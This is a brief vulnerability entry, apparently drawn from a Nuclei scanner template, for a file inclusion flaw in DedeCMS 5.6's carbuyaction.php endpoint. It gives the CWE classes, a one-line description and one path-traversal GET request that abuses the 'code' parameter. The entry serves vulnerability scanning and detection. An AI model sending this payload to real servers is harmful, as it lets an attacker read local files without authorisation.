# Vulnerability: DedeCmsV5.6 Carbuyaction Fileinclude
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`dedecms-carbuyaction-fileinclude.yaml`)

## Description
A vulnerability in DedeCMS's 'carbuyaction.php' endpoint allows remote attackers to return the content of locally stored files via a vulnerability in the 'code' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/plus/carbuyaction.php?dopost=return&code=../../
```

